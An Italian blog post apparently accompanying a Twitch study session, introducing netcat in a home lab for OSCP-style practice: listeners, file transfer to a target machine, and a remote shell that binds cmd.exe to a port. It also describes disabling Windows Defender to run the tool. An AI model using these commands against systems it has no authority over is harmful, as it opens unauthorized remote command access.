---
title: Reverse Shell: giocare con netcat
url: https://roccosicilia.com/2022/10/25/reverse-shell-giocare-con-netcat/
source: Over Security - Cybersecurity news aggregator
date: 2022-10-27
fetch_date: 2025-10-03T21:02:01.946451
---

# Reverse Shell: giocare con netcat

# [Rocco Sicilia](https://roccosicilia.com)

Search

* [Home](https://roccosicilia.com)
* [About me](https://roccosicilia.com/about/)
* [Divulgazione](https://roccosicilia.com/progetto-di-divulgazione/)
* [Sostieni il progetto](https://roccosicilia.com/sostieni-il-progetto/)
* [English version](https://medium.com/%40roccosicilia)

[cyber security](https://roccosicilia.com/category/cyber-security/), [hacking](https://roccosicilia.com/category/hacking/), [ita](https://roccosicilia.com/category/ita/)

## [Reverse Shell: giocare con netcat](https://roccosicilia.com/2022/10/25/reverse-shell-giocare-con-netcat/)

Published by

Rocco Sicilia

on

[25 ottobre 2022](https://roccosicilia.com/2022/10/25/reverse-shell-giocare-con-netcat/)

Approfitto della [sessione live #studywithme](https://www.twitch.tv/roccosicilia) che ho iniziato a proporre il martedì sera sul mio canale Twitch per proporre una “dispensa” sugli argomenti trattati. Premetto che la live in questione è durata poco in quanto lo scorso martedì ero abbastanza provato dallo giornata, abbiamo comunque introdotto netcat e ci siamo scontrati (come spesso capita) con i limiti delle versioni disponibili per MS Windows.

Prima di passare all’esplorazione dell’utility dedico qualche minuto al reperimento della stessa. Mentre se avere una linux-box potrete tranquillamente installare quello che vi serve dai pacchetti della vostra distro, su Windows bisogna necessariamente reperire il binario ed assicurarsi che il vostro sistema anti-malware non lo vada a spianare al primo utilizzo. Per poterlo utilizzare nella mia macchina di test su VirtualBox ho dovuto necessitamene disattivare prima Defender e creare poi una eccezione. Ho utilizzato il binario disponibile qui: <https://nmap.org/ncat/>.

![](https://roccosicilia.com/wp-content/uploads/2022/10/image-5.png?w=1024)

screen della vm Win10

Predisporre il lab con una macchina Windows ed una macchina Linux ci consente di seguire gli esempi della documentazione #OSCP. Ovviamente possiamo tranquillamente lavorare anche sono con ambienti \*nix like.

## Utilizzo base

Fondamentalmente netcat è una utility che ci consente di leggere e scrivere dati attraverso una connessione di rete sia via TCP che via UDP. Possiamo quindi utilizzarlo per connetterci ad un servizio come un POP o SMTP server:

![](https://roccosicilia.com/wp-content/uploads/2022/10/image-6.png?w=700)

classica connessione ad un servizio

Una delle funzionalità che più rimanda al tema delle reverse shell è la possibilità di mettere in listening su una porta specifica netcat:

```
$ nc -nlvp 1337
Listening on 0.0.0.0 1337
```

Una volta avviata la sessione possiamo ovviamente provare ad interagire ad esempio eseguendo una richiesta tramite un client come un browser:

![](https://roccosicilia.com/wp-content/uploads/2022/10/image-7.png?w=1024)

HTTP GET da un browser

La funzione di per se è utile per fare delle verifiche a livello di comunicazione. Più frequentemente questa funzionalità è utilizzata per ricevere una sessione da un “client” netcat che, senza altri accorgimenti, consentirà di inviare e leggere i caratteri all’interno della sessione in entrambe le direzioni:

![](https://roccosicilia.com/wp-content/uploads/2022/10/image-9.png?w=1024)

connessione “client/server”

Passando ad utilizzi più pragmatici vi è la possibilità di trasferire file da un sistema all’altro semplicemente con il comando:

```
$ nc -v {HOST} < /usr/share/windows-binaries/wget.exe
Connection to 192.168.1.12 1337 port [tcp/*] succeeded!
```

Ovviamente lato sistema target va prima reindirizzato l’output verso un file “destinazione”:

```
c:\Test>nc -nlvp 1337 > wget.exe
listening on [any] 1337 ...
```

Il risultato sarà l’upload del file wget.exe sulla macchina target.

E arriviamo all’utilizzo per il quale probabilmente è più famoso: la possibilità di gestire una shell attraverso una sessione. Il funzionamento in tal senso è molto semplice, abbiamo visto come aprire una sessione di comunicazione tra due macchine al fine di inviare semplici caratteri, ora possiamo utilizzare qualcosa di simile per legare un processo come cmd.exe alla sessione TCP. La funzionalità è disponibile solo per le versione che presentano il flag ***-e***, controllare questo requisito.

```
c:\Test>nc -nlvp 1337 -e cmd.exe
listening on [any] 1337 ...
```

Il comando per connettersi alla sessione, che dovrebbe restituire il prompt dei comandi di DOS, è altrettanto semplice:

```
$ nc -v 192.168.1.12 1337
```

![](https://roccosicilia.com/wp-content/uploads/2022/10/image-10.png?w=1024)

la classica reverse shell

## Qualche curiosità

Netcat è uno strumento molto duttile utilizzato, anche se forse non frequentemente, in molteplici scenari. Ho raccolto qualche esempio che credo possa valere la pensa di tenere a mente.

### Network port-scan

![](https://roccosicilia.com/wp-content/uploads/2022/10/image-11.png?w=721)

-w necessario per il timeout

### HTTP requests

![](https://roccosicilia.com/wp-content/uploads/2022/10/image-12.png?w=1024)

---

Qualche risorsa aggiuntiva:

* <https://nmap.org/ncat/guide/index.html>
* <http://www.g-loaded.eu/2006/11/06/netcat-a-couple-of-useful-examples/>
* <https://www.kali.org/tools/windows-binaries/#windows-binaries>
* <https://www.hackingarticles.in/netcat-for-pentester/>

---

Personalmente l’utilizzo principale è quello relativo alle reverse shell e l’impiego in contesti di troubleshooting su anomalie di rete o verifica della bontà delle richieste. L’utilizzo, negli esempi della porta 1337 è ovviamente un riferimento nerd al [leet](https://it.wikipedia.org/wiki/Leet), ma è effettivamente la porta che utilizzo nei miei lavoratori. In contesti reali come attività di Pen Testing o simulazioni di solito valuto in base al contesto quali porte utilizzare e, soprattutto, non utilizzo netcat in queste modalità in quanto tutto il traffico sarebbe in chiaro. Nella prossima live, programmata per martedì 01 novembre, ci avviciniamo di più a quello che potremmo fare in una sessione di PenTesting.

### Condividi:

* Fai clic per inviare un link a un amico via e-mail (Si apre in una nuova finestra)
  E-mail
* [Fai clic qui per condividere su LinkedIn (Si apre in una nuova finestra)
  LinkedIn](https://roccosicilia.com/2022/10/25/reverse-shell-giocare-con-netcat/?share=linkedin)
* [Fai clic per condividere su Telegram (Si apre in una nuova finestra)
  Telegram](https://roccosicilia.com/2022/10/25/reverse-shell-giocare-con-netcat/?share=telegram)
* [Fai clic per condividere su WhatsApp (Si apre in una nuova finestra)
  WhatsApp](https://roccosicilia.com/2022/10/25/reverse-shell-giocare-con-netcat/?share=jetpack-whatsapp)

Mi piace Caricamento…

### Lascia un commento [Cancella risposta](/2022/10/25/reverse-shell-giocare-con-netcat/#respond)

Δ

Questo sito utilizza Akismet per ridurre lo spam. [Scopri come vengono elaborati i dati derivati dai commenti](https://akismet.com/privacy/).

←[Precedente: Allenamento “cyber”](https://roccosicilia.com/2022/10/18/allenamento-cyber/)

[Successivo: Anti-DDoS](https://roccosicilia.com/2022/12/02/anti-ddos/)→

Ciao,

### sono Rocco

![](https://sheliakblog.wordpress.com/wp-content/uploads/2025/04/photo.jpeg?w=389)

… e questo è mio sito personale dove condivido idee, riflessioni ed esperienze su hacking e sicurezza informatica.

### Let’s connect

* [Patreon](https://patreon.com/roccosicilia)

* [YouTube](https://youtube.com/%40roccosicilia)

* [LinkedIn](https://www.linkedin.com/in/roccosicilia/)

### Rimani aggiornato!

Iscriviti per ricevere gli update dei nuovi post e video.

Digita la tua e-mail…

→

### Recent posts

* [![Info Sec Unplugged [1a] – DR e Cyber recovery (parte 1)](https://roccosicilia.com/wp-content/uploads/2024/12/podcast.png?w=541)](https://roccosicilia.com/2025/09/22/info-sec-unplugged-1a-dr-e-cyber-recovery-parte-1/)

  ## [Info Sec Unplugged [1a] – DR e Cyber recovery (parte 1)](https://roccosicilia.com/2025/09/22/info-sec-unplugged-1a-dr-e-cyber-recovery-parte-1...